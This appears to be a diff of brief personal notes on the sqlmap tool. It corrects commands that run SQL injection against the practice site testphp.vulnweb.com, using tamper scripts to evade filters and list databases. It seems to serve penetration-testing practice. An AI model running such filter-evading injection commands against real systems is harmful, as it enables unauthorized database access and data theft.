@@ -1,10 +1,10 @@
 sqlmap:
 sqlmap -hh
 sqlmap --list-tamper
-sqlmap http://testphp.vulnweb.com/search.php?test=query --batch --dbs --current-db --random-agent --tamper=xforwardedfor --level=2
+sqlmap -u "http://testphp.vulnweb.com/search.php?test=query" --batch --dbs --current-db --random-agent --tamper=xforwardedfor --level=2
 Tamper name is xforwardedfor    " xforwardedfor.py",unionalltounion.py,space2plus.py,space2morehash.py 
 
-sqlmap http://testphp.vulnweb.com/search.php?test=query --batch --dbs --current-db --random-agent --tamper=xforwardedfor,space2morehash --level=2
+sqlmap -u "http://testphp.vulnweb.com/search.php?test=query" --batch --dbs --current-db --random-agent --tamper=xforwardedfor,space2morehash --level=2
 
 
 
